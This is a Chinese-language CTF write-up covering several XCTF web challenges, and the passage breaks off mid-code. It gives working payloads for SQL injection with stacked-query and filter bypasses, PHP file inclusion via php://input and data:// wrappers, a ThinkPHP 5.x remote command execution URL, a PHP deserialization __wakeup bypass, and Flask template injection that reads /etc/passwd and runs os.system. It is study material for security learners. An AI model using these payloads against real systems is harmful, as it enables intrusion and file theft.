<h2 id="NewsCenter-x2F-XCTF-4th-QCTF-2018-2"><a href="#NewsCenter-x2F-XCTF-4th-QCTF-2018-2" class="headerlink" title="NewsCenter&#x2F;XCTF 4th-QCTF-2018(2)"></a>NewsCenter&#x2F;XCTF 4th-QCTF-2018(2)</h2><p>输入<code>1&#39; or 1=1#</code>发现有sql注入漏洞<br>sqlmap对抓包结果进行注入，得到flag<br><code>cyberpeace&#123;d59b2f9aadab6159052039f0edeefe3a&#125;</code><br>但是这个flag不是这一题的<br><strong>为什么sqlmap不行呢？</strong><br><a href="https://www.bbsmax.com/A/1O5ENAr4d7/">sqlmap手册</a><br>因为之前用sqlmap刷了其它题，有缓存<br><strong>使用–purge清除缓存注入</strong></p>
<p>直接手工注入<br><code>1&#39; order by 4#</code>错误，说明3个注入点<br><code>1&#39; union select 1,2,3#</code>，发现2，3有输出<br><code>1&#39; union select 1,database(),3#</code>，dbs&#x3D;&#x3D;<code>news</code><br><code>1&#39; union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema=&#39;news&#39;#</code>，tbn&#x3D;<code>news,secret_table</code><br><code>1&#39; union select 1,database(),group_concat(column_name) from information_schema.columns where table_name=&#39;secret_table&#39;#</code>，<code>id,fl4g</code><br><code>1&#39; union select 1,group_concat(id),group_concat(fl4g) from secret_table#</code><br>得到flag<br><code>QCTF&#123;sq1_inJec7ion_ezzz&#125;</code></p>
<h2 id="warmup-x2F-HCTF（2）"><a href="#warmup-x2F-HCTF（2）" class="headerlink" title="warmup&#x2F;HCTF（2）"></a>warmup&#x2F;HCTF（2）</h2><p>访问看到一个<img data-src="https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg" alt="img"></p>
<p>查看源代码发现提示<code>source.php</code>，访问看到php代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;<span class="variable">$page</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable">$whitelist</span> = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !<span class="title function_ invoke__">is_string</span>(<span class="variable">$page</span>)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">                //<span class="title function_ invoke__">mb_substr</span>() 函数返回字符串的一部分，<span class="title function_ invoke__">substr</span>()函数只针对英文字符，分割中文文字使用 <span class="title function_ invoke__">mb_substr</span>()</span><br><span class="line">                <span class="variable">$page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)//.是拼接符</span><br><span class="line">                //<span class="title function_ invoke__">mb_strpos</span>()返回要查找的字符串在字符串中首次出现的位置</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$page</span>);</span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">                <span class="variable">$_page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; <span class="title function_ invoke__">is_string</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::<span class="title function_ invoke__">checkFile</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>访问一下<code>hint.php</code>，提示<code>flag not here, and flag in ffffllllaaaagggg</code></p>
<p>那就只能靠source.php，大概思路应该是传一个用<code>?</code>拼接的字符串，截断后的前部分是列表内的内容，后部分是<code>ffffllllaaaagggg</code>，那就构建<code>hint.php?ffffllllaaaagggg</code>，但是这个作为参数传进去没有flag显示。</p>
<p>看了<a href="https://blog.csdn.net/weixin_45677145/article/details/120221712">大佬的wp</a>，发现需要用<code>…/</code>尽可能多的返回到顶级目录，即<code>hint.php?/../../../../ffffllllaaaagggg</code>，就能得到flag</p>
<p><a href="https://blog.csdn.net/MrTreebook/article/details/123460946">大佬的思路</a>里还把<code>?</code>编码了来绕过第三个判断，但是好像没有必要</p>
<p><code>flag&#123;25e7bce6005c4e0c983fb97297ac6e5a&#125;</code></p>
<h2 id="supersqli-x2F-强网杯（2）"><a href="#supersqli-x2F-强网杯（2）" class="headerlink" title="supersqli&#x2F;强网杯（2）"></a>supersqli&#x2F;强网杯（2）</h2><p>打开看一下源码，提示sqlmap是没有灵魂的</p>
<p>直接上sqlmap，</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://61.147.171.105:50519/?inject=1  --dbs --batch</span><br><span class="line">sqlmap -u http://61.147.171.105:50519/?inject=1  -D supersqli --tables --batch</span><br><span class="line">//这里提示 No tables found</span><br></pre></td></tr></table></figure>

<p>那就手工注一下</p>
<p>输入<code>1&#39; or 1=1#</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">array(2) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(1) &quot;1&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(7) &quot;hahahah&quot;</span><br><span class="line">&#125;</span><br><span class="line">array(2) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(1) &quot;2&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(12) &quot;miaomiaomiao&quot;</span><br><span class="line">&#125;</span><br><span class="line">array(2) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(6) &quot;114514&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(2) &quot;ys&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>看了<a href="https://blog.csdn.net/nicesa/article/details/106390405">大佬的思路</a>，发现它过滤了下列字符，且使用<code>/i</code>标记大小写不敏感</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</span><br></pre></td></tr></table></figure>

<p>但是可以用<code>;</code>执行多执行多sql语句，采用堆叠查询</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27;;show tables#</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(16) &quot;1919810931114514&quot;</span><br><span class="line">&#125;</span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(5) &quot;words&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27;;show columns from `1919810931114514`#</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">array(6) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(4) &quot;flag&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(12) &quot;varchar(100)&quot;</span><br><span class="line">  [2]=&gt;</span><br><span class="line">  string(2) &quot;NO&quot;</span><br><span class="line">  [3]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [4]=&gt;</span><br><span class="line">  NULL</span><br><span class="line">  [5]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后采用预编译的方式进行绕过过滤select</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27;;set @sql = CONCAT(&#x27;</span>sele<span class="string">&#x27;,&#x27;</span>ct <span class="operator">*</span> <span class="keyword">from</span> `<span class="number">1919810931114514</span>`;<span class="string">&#x27;);prepare aaa from @sql;EXECUTE aaa;#</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">strstr($inject, &quot;set&quot;) &amp;&amp; strstr($inject, &quot;prepare&quot;)</span><br></pre></td></tr></table></figure>

<p>发现使用strstr()过滤了<code>set</code>和<code>prepare</code></p>
<p><code>strstr(str1,str2) 函数用于判断字符串str2是否是str1的子串</code></p>
<p>但是这个可以用大小写绕过</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27;;sEt @sql = CONCAT(&#x27;</span>sele<span class="string">&#x27;,&#x27;</span>ct <span class="operator">*</span> <span class="keyword">from</span> `<span class="number">1919810931114514</span>`;<span class="string">&#x27;);prEpare aaa from @sql;EXECUTE aaa;#</span></span><br></pre></td></tr></table></figure>

<p>然后就能得到flag</p>
<p>看了官方的wp，因为题目没有禁用rename和alter，可以把words表改名成其它，把1919810931114514表改成words（因为word是默认查询的表），但是它少了一个id列，可以将flag字段改为id，或者添加id字段。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;;rename tables `words` to `words1`;rename tables `1919810931114514` to `words`; alter table `words` change `flag` `id` varchar(100);#</span></span><br></pre></td></tr></table></figure>

<p>然后查询-1’ or 1&#x3D;1#也能得到flag</p>
<p>另一位大佬的wp使用了关键字<code>handler</code>，也能得到flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;;handler `1919810931114514` open as `a`;handler `a` read next;</span><br></pre></td></tr></table></figure>

<p><a href="https://blog.csdn.net/weixin_30623181/article/details/113428768">handler详解</a></p>
<ul>
<li><p>handler  tbl_name open as yunensec; #指定数据表进行载入并将返回句柄重命名</p>
</li>
<li><p>handler tbl_name read first; #读取指定表&#x2F;句柄的首行数据</p>
</li>
<li><p>handler tbl_name read next; #读取指定表&#x2F;句柄的下一行数据</p>
</li>
<li><p>handler yunensec close; #关闭句柄</p>
</li>
</ul>
<p><code>flag&#123;c168d583ed0d4d7196967b28cbd0b5e9&#125;</code></p>
<h2 id="Web-php-include-x2F-CTF（2）"><a href="#Web-php-include-x2F-CTF（2）" class="headerlink" title="Web_php_include&#x2F;CTF（2）"></a>Web_php_include&#x2F;CTF（2）</h2><p>访问，php代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_GET</span>[<span class="string">&#x27;hello&#x27;</span>];</span><br><span class="line"><span class="variable">$page</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line"><span class="keyword">while</span> (<span class="title function_ invoke__">strstr</span>(<span class="variable">$page</span>, <span class="string">&quot;php://&quot;</span>)) &#123;</span><br><span class="line">    <span class="variable">$page</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php://&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$page</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$page</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>看了下<a href="https://blog.csdn.net/yingyugo/article/details/109783035">大佬的wp</a>，主要是两种伪协议，传php代码或者木马？</p>
<p>1.php:&#x2F;&#x2F;伪协议</p>
<p><a href="https://www.php.net/manual/zh/wrappers.php.php">php:&#x2F;&#x2F;</a></p>
<p>这里是用php:&#x2F;&#x2F;input协议传php代码</p>
<p>hackbar我这里也不行</p>
<p>bp可以，访问<code>/?page=pHp://input</code>（使用大小写或者双写绕过），抓包，在下面添加</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;ls&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>返回</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fl4gisisish3r3.php</span><br><span class="line">index.php</span><br><span class="line">phpinfo.php</span><br></pre></td></tr></table></figure>

<p>然后用cat查看fl4gisisish3r3.php，就能得到flag</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat fl4gisisish3r3.php&#x27;</span>);<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$flag</span>=<span class="string">&quot;ctf&#123;876a5fca-96c6-4cbd-9075-46f0c89475d2&#125;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>2.data:&#x2F;&#x2F;伪协议</p>
<p>需满足<code>allow_url_fopen</code>，<code>allow_url_include</code>同时开启才能使用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file.php?file=data://text/plain,&lt;?php phpinfo()?&gt;</span><br></pre></td></tr></table></figure>

<p>这里不能直接用php，需要使用base64加密后才能得到flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmw0Z2lzaXNpc2gzcjMucGhwIik/Pg==</span><br><span class="line"></span><br><span class="line">&lt;?php system(&quot;cat fl4gisisish3r3.php&quot;)?&gt;//base64编码后得到后面的字符</span><br></pre></td></tr></table></figure>

<p>这里需要查看源码才能得到flag</p>
<p>3.借助hello参数</p>
<p>这里要构造hello参数必须先page参数为真才能包含。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/?page=http:<span class="comment">//127.0.0.1/?hello=&lt;?system(&quot;ls&quot;)?&gt;</span></span><br><span class="line">/?page=http:<span class="comment">//127.0.0.1/?hello=&lt;?show_source (&quot;fl4gisissh3r3.php&quot;)?&gt;</span></span><br></pre></td></tr></table></figure>

<p>也能得到flag</p>
<p><code>ctf&#123;876a5fca-96c6-4cbd-9075-46f0c89475d2&#125;</code></p>
<h2 id="php-rce（2）"><a href="#php-rce（2）" class="headerlink" title="php_rce（2）"></a>php_rce（2）</h2><p>ThinkPHP 5.X - Remote Command Execution</p>
<p>远程代码执行漏洞，参数名是<code>s</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ls /</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bin boot dev etc flag home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var var</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat /flag</span><br></pre></td></tr></table></figure>

<p>或者通过find命令查找flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=find / -name &quot;flag&quot;</span><br><span class="line"></span><br><span class="line">/flag /flag</span><br></pre></td></tr></table></figure>

<p><code>flag&#123;thinkphp5_rce&#125;</code></p>
<h2 id="Web-php-unserialize-x2F-CTF（2）"><a href="#Web-php-unserialize-x2F-CTF（2）" class="headerlink" title="Web_php_unserialize&#x2F;CTF（2）"></a>Web_php_unserialize&#x2F;CTF（2）</h2><p>php代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123; </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file = <span class="variable">$file</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @<span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;file, <span class="literal">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>])) &#123; </span><br><span class="line">    <span class="variable">$var</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>]); </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="variable">$var</span>)) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;stop hacking!&#x27;</span>); </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$var</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&quot;index.php&quot;</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>正则表达式<code>/[oc]:\d+:/i</code>匹配</p>
<p><code>/.../</code>表示匹配中间的表达式</p>
<p><code>[oc]</code>匹配o或者c</p>
<p><code>:</code></p>
<p><code>\d</code>匹配一个数字字符。等价于 [0-9]。</p>
<p><code>+</code>匹配前面的子表达式一次或多次，多个数字</p>
<p><code>i</code>大小写不敏感</p>
<p>所以参数<code>var</code>需要满足base64解码后不包含<code>o:1</code>，但是可以用<code>o:+4</code></p>
<p>php中类实例化的时候，首先运行wakeup()函数，在序列化时先运行sleep()函数,在反序列化时先运行wakeup()，在脚本结束调用destruct()函数。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wakeup()有个执行漏洞：一个字符串或对象被序列化后，如果其属性被修改，则不会执行wakeup()函数</span><br><span class="line">只要序列化的中的成员数大于实际成员数，即可绕过wakeup()</span><br></pre></td></tr></table></figure>

<p>public属性被序列化的时候属性值会变成属性名<br>protected属性被序列化的时候属性值会变成\x00*\x00属性名<br>private属性被序列化的时候属性值会变成\x00类名\x00属性名<br>其中：\x00表示空字符，但是还是占用一个字符位置</p>
<p>修改序列化字符串中属性1改为2绕过wakeup()函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;Demo&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">10</span>:<span class="string">&quot;Demofile&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;fl4g.php&quot;</span>;&#125;</span><br><span class="line">O:+<span class="number">4</span>:<span class="string">&quot;Demo&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">10</span>:<span class="string">&quot;Demofile&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;fl4g.php&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>这里Demofile左右是有\x00的，但是被编辑器忽略了</p>
<p><img data-src="https://img-blog.csdnimg.cn/6e8c7c7684be4af4b624c9dadc5244cb.png" alt="在这里插入图片描述"></p>
<p>可以在bp里面修改，这里要加00</p>
<p><img data-src="https://img-blog.csdnimg.cn/8b7009e5f1ea4d2494dd66836207574f.png" alt="在这里插入图片描述"></p>
<p>然后base64加密一下用var传参就能得到flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?var=TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQo=</span><br></pre></td></tr></table></figure>

<p><code>ctf&#123;b17bd4c7-34c9-4526-8fa8-a0794a197013&#125;</code></p>
<h2 id="Web-python-template-injection-x2F-CTF-2"><a href="#Web-python-template-injection-x2F-CTF-2" class="headerlink" title="Web_python_template_injection&#x2F;CTF(2)"></a>Web_python_template_injection&#x2F;CTF(2)</h2><p>完全不会，看看<a href="https://blog.csdn.net/Mr_helloword/article/details/107949217">大佬的wp</a></p>
<p><a href="https://www.freebuf.com/column/187845.html">flask模板注入</a></p>
<p>访问<code>/&#123;&#123;config&#125;&#125;</code>查看全局变量</p>
<p>文件包含：是通过python的对象的继承来一步步实现文件读取和命令执行的的。</p>
<p>思路：找到父类&lt;type ‘object’&gt;–&gt;寻找子类–&gt;找关于命令执行或者文件操作的模块。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">魔术方法</span><br><span class="line">__class__  返回类型所属的对象</span><br><span class="line">__mro__    返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。</span><br><span class="line">__base__   返回该对象所继承的基类  // __base__和__mro__都是用来寻找基类的</span><br><span class="line"></span><br><span class="line">__subclasses__   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表</span><br><span class="line">__init__  类的初始化方法</span><br><span class="line">__globals__  对包含函数全局变量的字典的引用</span><br></pre></td></tr></table></figure>

<p>寻找可用引用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>有一个<code>&lt;type &#39;file&#39;&gt;</code>可以用来文件读取，例如</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123; [].__class__.__base__.__subclasses__()[40](&#x27;/etc/passwd&#x27;).read() &#125;&#125;</span><br></pre></td></tr></table></figure>

<p><code>&lt;class &#39;warnings.catch_warnings&#39;&gt;</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123; [].__class__.__base__.__subclasses__()[59].__init__.func_globals.keys() &#125;&#125;</span><br></pre></td></tr></table></figure>

<p><code>&lt;class ‘site._Printer’&gt;</code>可以用来命令执行，例如</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#x27;os&#x27;].listdir(&#x27;.&#x27;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#x27;os&#x27;].system(&#x27;ls&#x27;)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">URL /[&#x27;index.py&#x27;, &#x27;fl4g&#x27;] not found</span><br></pre></td></tr></table></figure>

<p>直接查看fl4g文件，得到flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123; [].__class__.__base__.__subclasses__()[40](&#x27;fl4g&#x27;).read() &#125;&#125;</span><br></pre></td></tr></table></figure>

<p><code>ctf&#123;f22b6844-5169-4054-b2a0-d95b9361cb57&#125;</code></p>
<h2 id="web2-x2F-CTF（2"><a href="#web2-x2F-CTF（2" class="headerlink" title="web2&#x2F;CTF（2)"></a>web2&#x2F;CTF（2)</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$miwen</span>=<span class="string">&quot;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$_o</span>=<span class="title function_ invoke__">strrev</span>(<span class="variable">$str</span>);<span class="comment">//反转字符串</span></span><br><span class="line">    <span class="comment">// echo $_o;</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$_0</span>=<span class="number">0</span>;<span class="variable">$_0</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$_o</span>);<span class="variable">$_0</span>++)&#123;</span><br><span class="line">        <span class="variable">$_c</span>=<span class="title function_ invoke__">substr</span>(<span class="variable">$_o</span>,<span class="variable">$_0</span>,<span class="number">1</span>);<span class="comment">//返回当前字符</span></span><br><span class="line">        <span class="variable">$__</span>=<span class="title function_ invoke__">ord</span>(<span class="variable">$_c</span>)+<span class="number">1</span>;<span class="comment">//返回字符串第一个字符的 ASCII 值+1</span></span><br><span class="line">        <span class="variable">$_c</span>=<span class="title function_ invoke__">chr</span>(<span class="variable">$__</span>);<span class="comment">//从指定ASCII码中返回字符</span></span><br><span class="line">        <span class="variable">$_</span>=<span class="variable">$_</span>.<span class="variable">$_c</span>;<span class="comment">//拼接</span></span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_rot13</span>(<span class="title function_ invoke__">strrev</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$_</span>)));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   逆向加密算法，解密$miwen就是flag</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>获取明文，反过来操作就行</p>
<p>如下，得到flag</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_o</span>=<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">strrev</span>(<span class="title function_ invoke__">str_rot13</span>(<span class="variable">$miwen</span>)));</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_o</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$_0</span>=<span class="number">0</span>;<span class="variable">$_0</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$_o</span>);<span class="variable">$_0</span>++)&#123;</span><br><span class="line">	<span class="variable">$_c</span>=<span class="title function_ invoke__">substr</span>(<span class="variable">$_o</span>,<span class="variable">$_0</span>,<span class="number">1</span>);</span><br><span class="line">	<span 